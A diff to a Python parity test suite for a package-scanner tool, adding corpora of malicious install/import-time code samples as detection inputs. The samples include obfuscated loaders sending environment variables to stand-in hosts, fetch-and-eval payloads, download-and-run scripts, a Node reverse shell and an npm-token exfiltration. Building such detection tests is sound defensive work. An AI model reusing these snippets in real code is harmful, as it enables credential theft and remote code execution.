@@ -35,6 +35,7 @@ import re
 import shlex
 import shutil
 import subprocess
+import threading
 import unittest
 
 from lazaret.scanner import core
@@ -50,12 +51,13 @@ const cases = JSON.parse(readFileSync(0, "utf8"));
 const results = cases.map((s) => [h.shlexSplit(s), h.hookTokens(s), h.followHook(s),
   h.installScriptRisk(s), h.importTimeRisk(s), h.nodeCandidates(s), h.nodeECodes(s), h.shebangLang(s),
   h.importTimeRisk(s, "py"), h.importTimeRisk(s, "js"),
-  ((at) => (at < 0 ? -1 : [...s.slice(0, at)].length))(h.selfPublishAt(s)), h.runsDll(s), h.joinStringPieces(s)]);
+  ((at) => (at < 0 ? -1 : [...s.slice(0, at)].length))(h.selfPublishAt(s)), h.runsDll(s), h.joinStringPieces(s),
+  h.decodedView(s), h.spawnedScripts(s)]);
 process.stdout.write(JSON.stringify({ twins: h.PY_TWINS, results }));
 """
 FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", "import_time_risk",
           "node_candidates", "_NODE_E_RE codes", "shebang_lang", "import_time_risk py", "import_time_risk js",
-          "self_publish_at", "runs_dll", "join_string_pieces")
+          "self_publish_at", "runs_dll", "join_string_pieces", "decoded_view", "spawned_scripts")
 
 # Realistic hook commands and install / import-time scripts
 CURATED = [
@@ -267,7 +269,10 @@ RECEIVED = ["\n", "\n", "\n", " ", ";", "(", ")", "=", "'", '"', "`", "\\", "\t"
             "x = os.popen", "(0, eval)(", "eval.call(null, ", "window['eval'](", "self['ev' + 'al'](",
             "pickle.loads(", "marshal.loads(", "yaml.load(", "yaml.load(x, Loader=yaml.SafeLoader)",
             "s.unserialize(", "unserialize(", "jsonpickle.decode(", "import(", "require(", "__import__(",
-            "importlib.import_module(", "import_module(", "name = ", "name", "blob = ", "blob"]
+            "importlib.import_module(", "import_module(", "name = ", "name", "blob = ", "blob",
+            # (0.1.8, the follower's adversarial pass) members by name and runners handed to a call
+            "getattr(rq, 'get')(", "getattr(r, \"text\", None)", "['get'](", '["text"]', ".then(eval)",
+            ".then(vm.runInThisContext)", "res.on('data', eval)", ", Function)", "(exec)"]
 # the 0.1.7 signs (audit P0): hidden or fetching PowerShell, stager strings,
 # reverse shells, host information sent out, beacons to capture services,
 # credentials sent to a named service, a download run with Python
@@ -431,6 +436,115 @@ PUBLISH_CURATED = [
     "execSync('rundll32 url.dll,FileProtocolHandler https://example.invalid')",
     "subprocess.run(['regsvr32', '/s', 'C:\\\\x\\\\helper.dll'])",
 ]
+# names and code in strings a file decodes as it runs, statements over several
+# rows, environment variables, Function.constructor, and a file written and
+# run with a shell or an interpreter (0.1.8): helpers, decode calls, arrays,
+# members named by literals, and the pieces around them
+DECODED = ["\n", "\n", " ", "  ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", " + ", ".", "\\", "\\\n",
+           "function g(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))); }",
+           "const d = (s) => Buffer.from(s, 'base64').toString();", "def unh(x):\n    return bytes.fromhex(x).decode()\n",
+           "g('72657175697265')", "g('6178696f73')", "g('706f7374')", "g('7468656e')", "g('7a')", "g('0a')", "g('6')",
+           "d('Y2hpbGRfcHJvY2Vzcw==')", "d('Y2hp')", "unh('6f73')", "g(x)", "g",
+           "Buffer.from('6f73', 'hex').toString()", "Buffer.from(\"6874747073\", \"hex\").toString('utf8')",
+           "Buffer.from('aHR0cHM=', 'base64').toString()", "Buffer.from('zz', 'hex').toString()",
+           "atob('ZXZhbA==')", "atob('ZXZhbA=')", "atob(`Y2hpbGRfcHJvY2Vzcw==`)",
+           "bytes.fromhex('6f73').decode()", "base64.b64decode('b3M=').decode()", "binascii.unhexlify('6f73').decode()",
+           "b64decode(b'cmVxdWVzdHM=').decode('utf-8')", "let hl = [", "const _0x = ['a', 'b'];", "'axios', ",
+           "'post'", "'https://x.invalid/a'", "hl[1]", "hl[3]", "hl[0]", "_0x[1]", "hl.push(1)", "hl[2] = 1",
+           "require(hl[1])[[hl[2]]](hl[3], { ...process.env })", "[[hl[7]]](r => eval(r.data))",
+           "process['env']", "process[\"env\"]", "x['post'](", "['a']", "'ch' + 'ild_process'", "\"ht\" + \"tps\"",
+           "os.environ['P'] = ", "os.environ.get('P')", "os.getenv('P', '')", "environ['P']", "process.env['P'] = ",
+           "process.env['P']", "process.env.P", "exec(os.getenv('P'))", "eval(process.env['P'])",
+           "require(process.env.M)", "requests.get(u).text", "(await axios.get(u)).data", "axios",
+           "\n  .post(u, {v})", "\n  .then((r) => {", "\n    eval(r.data);", "\n  })", "subprocess.run(",
+           "\n    ['curl', '-sL',", "\n     'https://x.invalid/p.js'],", "\n    capture_output=True)",
+           "subprocess.run(['node', '-e', r.stdout])", "new Function.constructor('require', s)",
+           "[].constructor.constructor(r.data)", "Object.constructor(c)", "['constructor']['constructor'](c)",
+           "open(p, 'wb')", "f.write(r.content)", "f.write(base64.b64decode(b64))", "b64 = 'aW1wb3J0IG9z'",
+           "subprocess.run(['/bin/bash', p])", "spawn('node', [f])", "fork(dst)", "os.system('sh ' + p)",
+           "subprocess.run([sys.executable, p])", "fs.writeFileSync(f, body)", "execfile(p)", "runpy.run_path(p)",
+           "\u00e9", "\U0001F600", "\u0663", "x" * 80]
+DECODED_CURATED = [
+    # (0.1.8, the follower's adversarial pass) members by name, and a runner handed to a call
+    "import requests\nexec(getattr(requests, 'get')('https://c2.invalid/p').text)\n",
+    "import requests\nr = requests.get('https://c2.invalid/p')\nexec(r.__dict__['_content'])\n",
+    "fetch('https://c2.invalid/p').then((r) => r.text()).then(eval);\n",
+    "const https = require('https');\nhttps.get('https://c2.invalid/p', (res) => res.on('data', eval));\n",
+    "const vm = require('vm');\nfetch('https://c2.invalid/p').then((r) => r.text()).then(vm.runInThisContext);\n",
+    "(async () => { (0, eval)(await (await fetch('https://c2.invalid/p')).text()); })();\n",
+    "fetch('https://c2.invalid/p').then((r) => r.text()).then(JSON.parse);\n",
+    # the tailwind-book-icon family, hex names through a helper and a constant array
+    "\"use strict\";\n\nfunction g(h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))); }\n\n"
+    "let hl = [\n    g('72657175697265'),\n    g('6178696f73'),\n    g('706f7374'),\n"
+    "    g('68747470733a2f2f782e696e76616c69642f61'),\n    g('68656164657273'),\n    g('782d7365637265742d686561646572'),\n"
+    "    g('736563726574'),\n    g('7468656e'),\n];\n\nconst writer = () => require(hl[1])[[hl[2]]](hl[3], "
+    "{ ...process.env }, { [hl[4]]: { [hl[5]]: hl[6] } })[[hl[7]]](r => eval(r.data));\n\nmodule.exports = writer;\n",
+    # postman-converters: hex-decoded module names, a member named by a literal
+    "(() => {\n  const _0x1a = require(\n    Buffer.from(\"6f73\", \"hex\").toString()\n  );\n  const _0x2b = require(\n"
+    "    Buffer.from(\"6874747073\", \"hex\").toString()\n  );\n  const e = Object.fromEntries(Object.keys(process[\"env\"])"
+    ".map(k => [k, process[\"env\"][k]]));\n  const req = _0x2b.request({ hostname: 'collector.invalid', method: 'POST' });\n"
+    "  req.write(JSON.stringify(e));\n  req.end();\n})();\n",
+    # chai-use-chain: Function.constructor runs what a download holds
+    "const axios = require('axios');\n(async () => {\n  const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;\n"
+    "  const handler = new Function.constructor(\"require\", s);\n  handler(require);\n})();\n",
+    # prettier's fluent chain, and a formatter's call over several rows
+    "const axios = require(\"axios\");\n(async ()=> {\n    try {\n        axios\n            .post(\"https://x.invalid/a\", {version })\n"
+    "            .then((r) => {\n                // c\n                eval(r.data.model);\n            });\n    } catch (e) {}\n})();\n",
+    "import subprocess\nif True:\n    r = subprocess.run(\n        ['curl', '-sL',\n         'https://x.invalid/p.js'],\n"
+    "        capture_output=True, text=True, timeout=10\n    )\n    if r.stdout:\n        subprocess.run(['node', '-e', r.stdout],\n"
+    "                       capture_output=True, timeout=30)\n",
+    # a received value carried by environment variables
+    "import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.getenv('P'))\n",
+    "const axios = require('axios');\n(async () => {\n  process.env['M'] = (await axios.get(u)).data;\n  require(process.env['M']);\n})();\n",
+    # ptmpl and litellm: a script downloaded, or decoded, written and run with an interpreter
+    "import subprocess, os, requests\n\ndef download_and_run_script():\n    script_url = 'https://x.invalid/s.sh'\n"
+    "    script_path = os.path.join(os.path.expanduser('~'), 's.sh')\n    response = requests.get(script_url)\n"
+    "    with open(script_path, 'wb') as file:\n        file.write(response.content)\n    os.chmod(script_path, 0o755)\n"
+    "    subprocess.run(['/bin/bash', script_path, '--restore'])\n",
+    "import subprocess, base64, sys, tempfile, os\n\nb64_payload = \"aW1wb3J0IG9zCg==\"\n\n"
+    "with tempfile.TemporaryDirectory() as d:\n    p = os.path.join(d, \"p.py\")\n    with open(p, \"wb\") as f:\n"
+    "        f.write(base64.b64decode(b64_payload))\n    \n    subprocess.run([sys.executable, p])\n",
+    "const b = Buffer.from(blob, 'base64');\nfs.writeFileSync(f, b);\nspawn(f, [], { detached: true });\n",
+    # the MAJOR shapes: a download written and required, or started by its path
+    "const body = await (await fetch(u)).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n",
+    "import os, requests\nd = requests.get(u).content\nopen('r.sh', 'wb').write(d)\nos.system('r.sh')\n",
+    # more reasons only the decoded strings show
+    "const cp = require(atob('Y2hpbGRfcHJvY2Vzcw=='));\nconst h = require(atob('aHR0cHM='));\n"
+    "h.get(u, (res) => { let b = ''; res.on('data', (c) => { b += c; }); res.on('end', () => cp.execSync(b)); });\n",
+    "import os\nrq = __import__(bytes.fromhex('7265717565737473').decode())\nexec(rq.get(u).text)\n",
+    "const n = require('ne' + 't');\nconst s = new n.Socket();\ns.connect(4444, '10.0.0.1', () => {\n"
+    "  const sh = require('child' + '_process').spawn('/bin/sh', []);\n  s.pipe(sh.stdin);\n  sh.stdout.pipe(s);\n});\n",
+    "const o = require(Buffer.from('6f73', 'hex').toString());\nrequire('https').get('https://abc.oastify.com/?h=' + o['hostname']());\n",
+    "function dec(s) { return Buffer.from(s, 'base64').toString(); }\nconst f = require(dec('ZnM='));\n"
+    "const t = f.readFileSync(require('path').join(require('os').homedir(), dec('Lm5wbXJj')), 'utf8');\n"
+    "fetch('https://collector.invalid', { method: 'POST', body: t + '_authToken' });\n",
+]
+# scripts a script starts with node or python (0.1.8): the calls, flags,
+# path forms and names assigned them, and the pieces around them
+SPAWN = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "\\", "/", "..", ".", "-",
+         "spawn(process.execPath, [", "spawnSync('node', [", "execFile(\"nodejs.exe\", [", "execFileSync(process.argv[0], [",
+         "fork(", "subprocess.Popen([sys.executable, ", "subprocess.run(['python3', ", "check_output([\"python\", ",
+         "spawn(cmd, [", "run([x, ", "'lib/x.js'", "\"./a/b.js\"", "`w.js`", "'-e'", "'-m'", "'-r'", "'--require=./p.js'",
+         "'--no-warnings'", "'-c'", "'-X'", "'dev'", "path.join(__dirname, 'x.js')", "path.resolve(__dirname, './lib', 'c.js')",
+         "path.join(here, 'y.js')", "os.path.join(os.path.dirname(__file__), 'start.py')",
+         "os.path.join(os.path.dirname(os.path.abspath(__file__)), '_rt', 's.py')", "Path(__file__).parent",
+         "__dirname + '/w.js'", "__dirname+\"/q.js\"", "`${__dirname}/t.js`", "`${ __dirname }/u.js`",
+         "const script = ", "let here = ", "_d = ", "script", "here", "_d", "f", "const f = path.join(__dirname, 'z.js');",
+         "path.join(", "__dirname", "'..'", "'a\\b.js'", "'/abs.js'", "'x'.repeat(3)", "\u00e9", "\U0001F600",
+         "], { detached: true })", "])", ")", "x" * 40]
+SPAWN_CURATED = [
+    "const { spawn } = require('child_process');\nconst path = require('path');\n"
+    "const filePath = path.join(__dirname, 'smtp-connection/index.js');\n"
+    "const child = spawn(process.execPath, [filePath], {\n  detached: true,\n  stdio: ['ignore', 'ignore', 'ignore']\n});\n"
+    "child.unref();\n",
+    "function runJobA(args) {\n  const script = path.resolve(__dirname, \"./lib/caller.js\");\n"
+    "  const child = spawn(\"node\", [script, JSON.stringify(args)], {\n    detached: true,\n    stdio: \"ignore\"\n  });\n}\n",
+    "_runtime_dir = os.path.join(os.path.dirname(__file__), \"_runtime\")\n_start = os.path.join(_runtime_dir, \"start.py\")\n"
+    "if os.path.exists(_start):\n    subprocess.Popen(\n        [sys.executable, _start],\n        cwd=_runtime_dir,\n    )\n",
+    "subprocess.run([sys.executable, '-m', 'pip', 'install', 'x'])\nspawn('node', ['-e', code])\n",
+    "spawn(process.execPath, ['-r', './preload.js', '--no-warnings', 'lib/main.js'])\n",
+    "const a = b, c = path.join(__dirname, 'a.js');\nfork(c);\n",
+]
 SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
            "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
            "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
@@ -444,10 +558,11 @@ def corpus(seed=20260926, scale=1):
     character they encode (a Python str could keep the two apart, a
     JavaScript string cannot)."""
     rnd = random.Random(seed)
-    cases = list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
+    cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
+             + DECODED_CURATED + SPAWN_CURATED)
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                 (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
-                                (SELF, 1500, 14), (PERSIST, 2500, 10), (PUBLISH, 3000, 12)):
+                                (SELF, 1500, 14), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
@@ -476,17 +591,36 @@ def core_view(text):
             core.install_script_risk(text), list(core.import_time_risk(text)), core.node_candidates(text),
             [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)],
             core.shebang_lang(text), list(core.import_time_risk(text, "py")), list(core.import_time_risk(text, "js")),
-            core.self_publish_at(text), core.runs_dll(text), core.join_string_pieces(text)]
+            core.self_publish_at(text), core.runs_dll(text), core.join_string_pieces(text), core.decoded_view(text),
+            [list(t) for t in core.spawned_scripts(text)]]
+
+
+def start_npm(cases):
+    """Start js/src/lib/hooks.js on the cases in the background (it runs while
+    core reads them: the suite's time is the slower engine's, not the sum);
+    finish_npm collects its answer."""
+    p = subprocess.Popen([NODE, "--input-type=module", "-e", NPM_HOOKS, HOOKS_JS], stdin=subprocess.PIPE,
+                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8", errors="replace")
+    box = {}
+    worker = threading.Thread(target=lambda: box.update(out=p.communicate(json.dumps(cases), timeout=60)))
+    worker.start()
+    return p, worker, box
+
+
+def finish_npm(started):
+    """(PY_TWINS, [results per case]) from the node process start_npm began."""
+    p, worker, box = started
+    worker.join()
+    stdout, stderr = box["out"]
+    if p.returncode:
+        raise AssertionError(f"node exited {p.returncode}: {stderr[-2000:]}")
+    out = json.loads(stdout)
+    return out["twins"], out["results"]
 
 
 def run_npm(cases):
     """(PY_TWINS, [results per case]) from js/src/lib/hooks.js."""
-    p = subprocess.run([NODE, "--input-type=module", "-e", NPM_HOOKS, HOOKS_JS], input=json.dumps(cases),
-                       capture_output=True, encoding="utf-8", errors="replace", timeout=60)
-    if p.returncode:
-        raise AssertionError(f"node exited {p.returncode}: {p.stderr[-2000:]}")
-    out = json.loads(p.stdout)
-    return out["twins"], out["results"]
+    return finish_npm(start_npm(cases))
 
 
 def mismatches(cases, views, results, limit=20):
@@ -508,8 +642,9 @@ class HookParityTests(unittest.TestCase):
     @classmethod
     def setUpClass(cls):
         cls.cases = corpus()
+        started = start_npm(cls.cases)
         cls.views = [core_view(text) for text in cls.cases]
-        cls.twins, cls.results = run_npm(cls.cases)
+        cls.twins, cls.results = finish_npm(started)
 
     def test_every_case_agrees(self):
         self.assertEqual(len(self.results), len(self.cases))
@@ -520,7 +655,7 @@ class HookParityTests(unittest.TestCase):
         """Guards the comparison against a corpus that stopped exercising
         something: each count is well above zero for this seed."""
         counts = collections.Counter()
-        for view in self.views:
+        for text, view in zip(self.cases, self.views):
             tokens, _, (targets, complete), install, (on_import, _), _, codes, lang, py, js = view[:10]
             counts["self-publishing"] += view[10] >= 0
             counts["runs a DLL"] += view[11] is not None
@@ -532,8 +667,15 @@ class HookParityTests(unittest.TestCase):
             counts["targets"] += bool(targets)
             counts["not followed completely"] += not complete
             counts["node -e codes"] += bool(codes)
+            counts["decoded view"] += view[13] != text
+            counts["spawned scripts"] += bool(view[14])
             for reason in install + on_import:
-                counts[reason.split(" (")[0]] += 1          # (the exfiltration reason names the address)
+                key = reason.split(" (")[0]                 # (the exfiltration reason names the address)
+                counts["a reason in decoded strings"] += reason.endswith(core._DV_NOTE)
+                for head in ("downloads a script and runs it with", "writes code it decodes to a file and runs it with"):
+                    if key.startswith(head) and key != "downloads a script and runs it with Python":
+                        key = head + " a shell or an interpreter"
+                counts[key] += 1
         # 10 install-script reasons (the environment, an exfiltration address, a pipe, received code in
         # three kinds, encoded PowerShell with and without a download-run, PowerShell that downloads and
         # runs, a stager, a reverse shell, host information) and the import-time ones (a harvest sent over
@@ -543,8 +685,9 @@ class HookParityTests(unittest.TestCase):
         # and the cases where reading a file without its prose (import_time_risk with a language)
         # changes the answer, for Python and for JavaScript, and code read back from the file itself;
         # and the 6 persistence reasons (0.1.7); and (0.1.8) the 3 reasons for publishing, npm tokens and a
-        # DLL run, with the self-publishing and DLL counters
-        self.assertEqual(len(counts), 39, counts)
+        # DLL run, with the self-publishing and DLL counters; a script downloaded or decoded, written and run
+        # with a shell or an interpreter, a decoded file run, the decoded view and a reason only it shows
+        self.assertEqual(len(counts), 45, counts)
         # these reasons are rarer in the random stream but present (curated) and well above zero
         rare = {"not followed completely", "deserializes data it receives over the network",
                 "loads a module named by data it receives over the network", "downloads a file and then runs it",
@@ -552,12 +695,17 @@ class HookParityTests(unittest.TestCase):
                 "runs an encoded PowerShell command that downloads and runs code",
                 "runs PowerShell that downloads and runs code",
                 "carries a GitHub Actions workflow that dumps every repository secret",
-                "downloads the Bun runtime from GitHub and runs code with it", "self-publishing"}
+                "downloads the Bun runtime from GitHub and runs code with it", "self-publishing",
+                "downloads a script and runs it with a shell or an interpreter", "writes a file it decodes and runs it",
+                "a reason in decoded strings"}
         self.assertEqual({k: n for k, n in counts.items() if n < 100 and k not in rare}, {}, counts)
         self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
         self.assertGreaterEqual(counts["deserializes data it receives over the network"], 25, counts)
         self.assertGreaterEqual(counts["loads a module named by data it receives over the network"], 25, counts)
         self.assertGreaterEqual(counts["downloads a file and then runs it"], 4, counts)
+        self.assertGreaterEqual(counts["downloads a script and runs it with a shell or an interpreter"], 20, counts)
+        self.assertGreaterEqual(counts["writes a file it decodes and runs it"], 10, counts)
+        self.assertGreaterEqual(counts["a reason in decoded strings"], 6, counts)
         self.assertGreaterEqual(counts["carries a GitHub Actions workflow that dumps every repository secret"], 30, counts)
         self.assertGreaterEqual(counts["downloads the Bun runtime from GitHub and runs code with it"], 30, counts)
         self.assertGreaterEqual(counts["self-publishing"], 30, counts)
@@ -580,14 +728,18 @@ class HookParityTests(unittest.TestCase):
         self.assertEqual(self.twins["limits"], {k: getattr(core, k) for k in
                                                 ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH",
                                                  "_DL_LONG_ROW", "_DL_WINDOW", "_DL_ARG_SPAN", "_DL_LOOKBACK",
-                                                 "_DL_NAMED_SEARCHES", "_DL_PHASES", "_DL_ALIAS_MAX",
+                                                 "_DL_NAMED_SEARCHES", "_DL_PHASES", "_DL_JOIN_ROWS", "_DL_JOIN_CHARS",
+                                                 "_DL_LOGICAL_MAX_CHARS",
+                                                 "_DL_ALIAS_MAX",
                                                  "_PS_ENCODED_MAX", "_STAGER_MIN", "_STAGER_MAX_LITERALS",
                                                  "_PS_EXEC_BACK", "_PS_EXEC_MAX_NAMES", "_SELF_READ_PASSES",
                                                  "_SELF_READ_MAX_CALLS", "_SELF_READ_ARG_SPAN", "_SELF_READ_MAX_ASSIGNS",
                                                  "_LITERAL_SPANS_MAX", "_PERSIST_MAX_LINES", "_SELF_PUB_SPAN",
-                                                 "_SELF_PUB_MAX")})
-        self.assertEqual(len(self.twins["patterns"]), 100)
-        self.assertEqual(len(self.twins["sets"]), 28)
+                                                 "_SELF_PUB_MAX", "_DV_MAX_LITERAL", "_DV_BODY", "_DV_MAX_HELPERS",
+                                                 "_DV_MAX_ARRAYS", "_DV_MAX_CHARS", "_SPAWN_MAX_DEPTH",
+                                                 "_SPAWN_MAX_FILES", "_SPAWN_NAME_DEPTH", "_SPAWN_MAX_TARGETS")})
+        self.assertEqual(len(self.twins["patterns"]), 126)
+        self.assertEqual(len(self.twins["sets"]), 30)
         self.assertEqual(len(self.twins["maps"]), 4)
 
 if __name__ == "__main__":
